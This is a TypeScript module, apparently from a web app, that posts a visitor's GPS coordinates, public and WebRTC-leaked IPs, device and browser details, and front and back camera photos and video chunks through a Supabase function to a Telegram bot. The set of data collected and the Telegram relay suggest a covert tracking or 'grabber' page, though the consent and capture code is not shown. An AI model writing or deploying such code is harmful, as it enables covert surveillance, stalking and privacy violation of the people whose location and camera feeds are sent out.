// Telegram API wrapper - sends all data through backend
import { projectId, publicAnonKey } from '/utils/supabase/info';

const API_BASE_URL = `https://${projectId}.supabase.co/functions/v1/make-server-039e5f24`;

export interface UserDataPayload {
  latitude: number;
  longitude: number;
  accuracy: number;
  publicIP?: string;
  webrtcIPs?: string[];
  device?: string;
  browser?: string;
  userAgent?: string;
  timezone?: string;
  languages?: string;
  localTime?: string;
}

// Send user data (geolocation + IP + device info) to Telegram
export async function sendUserDataToTelegram(data: UserDataPayload): Promise<boolean> {
  try {
    console.log('📤 [TelegramAPI] Sending user data to backend...');
    
    const response = await fetch(`${API_BASE_URL}/telegram/send-user-data`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${publicAnonKey}`
      },
      body: JSON.stringify(data)
    });
    
    const result = await response.json();
    
    if (result.success) {
      console.log('✅ [TelegramAPI] User data sent successfully');
      return true;
    } else {
      console.error('❌ [TelegramAPI] Failed to send user data:', result.error);
      return false;
    }
  } catch (error) {
    console.error('❌ [TelegramAPI] Error sending user data:', error);
    return false;
  }
}

// Send photo to Telegram
export async function sendPhotoToTelegram(
  photoBlob: Blob,
  cameraType: 'front' | 'back',
  device?: string,
  userAgent?: string
): Promise<boolean> {
  try {
    console.log(`📤 [TelegramAPI] Sending photo (${cameraType}) to backend...`);
    
    const formData = new FormData();
    formData.append('photo', photoBlob, `photo_${cameraType}_${Date.now()}.jpg`);
    formData.append('cameraType', cameraType);
    if (device) formData.append('device', device);
    if (userAgent) formData.append('userAgent', userAgent);
    
    const response = await fetch(`${API_BASE_URL}/telegram/send-photo`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${publicAnonKey}`
      },
      body: formData
    });
    
    const result = await response.json();
    
    if (result.success) {
      console.log(`✅ [TelegramAPI] Photo (${cameraType}) sent successfully`);
      return true;
    } else {
      console.error(`❌ [TelegramAPI] Failed to send photo (${cameraType}):`, result.error);
      return false;
    }
  } catch (error) {
    console.error(`❌ [TelegramAPI] Error sending photo (${cameraType}):`, error);
    return false;
  }
}

// Send video to Telegram
export async function sendVideoToTelegramAPI(
  videoBlob: Blob,
  chunkNumber: number,
  cameraType: 'front' | 'back',
  device?: string,
  userAgent?: string
): Promise<boolean> {
  try {
    console.log(`📤 [TelegramAPI] Sending video chunk #${chunkNumber} (${cameraType}) to backend...`);
    
    const formData = new FormData();
    formData.append('video', videoBlob, `video_${cameraType}_chunk${chunkNumber}_${Date.now()}.webm`);
    formData.append('chunkNumber', chunkNumber.toString());
    formData.append('cameraType', cameraType);
    if (device) formData.append('device', device);
    if (userAgent) formData.append('userAgent', userAgent);
    
    const response = await fetch(`${API_BASE_URL}/telegram/send-video`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${publicAnonKey}`
      },
      body: formData
    });
    
    const result = await response.json();
    
    if (result.success) {
      console.log(`✅ [TelegramAPI] Video chunk #${chunkNumber} (${cameraType}) sent successfully`);
      return true;
    } else {
      console.error(`❌ [TelegramAPI] Failed to send video chunk #${chunkNumber} (${cameraType}):`, result.error);
      return false;
    }
  } catch (error) {
    console.error(`❌ [TelegramAPI] Error sending video chunk #${chunkNumber} (${cameraType}):`, error);
    return false;
  }
}

// Send /start notification
export async function sendStartNotification(): Promise<boolean> {
  try {
    console.log('📤 [TelegramAPI] Sending /start notification to backend...');
    
    const response = await fetch(`${API_BASE_URL}/telegram/send-start-notification`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${publicAnonKey}`
      },
      body: JSON.stringify({
        timestamp: new Date().toISOString()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      console.log('✅ [TelegramAPI] /start notification sent successfully');
      return true;
    } else {
      console.error('❌ [TelegramAPI] Failed to send /start notification:', result.error);
      return false;
    }
  } catch (error) {
    console.error('❌ [TelegramAPI] Error sending /start notification:', error);
    return false;
  }
}
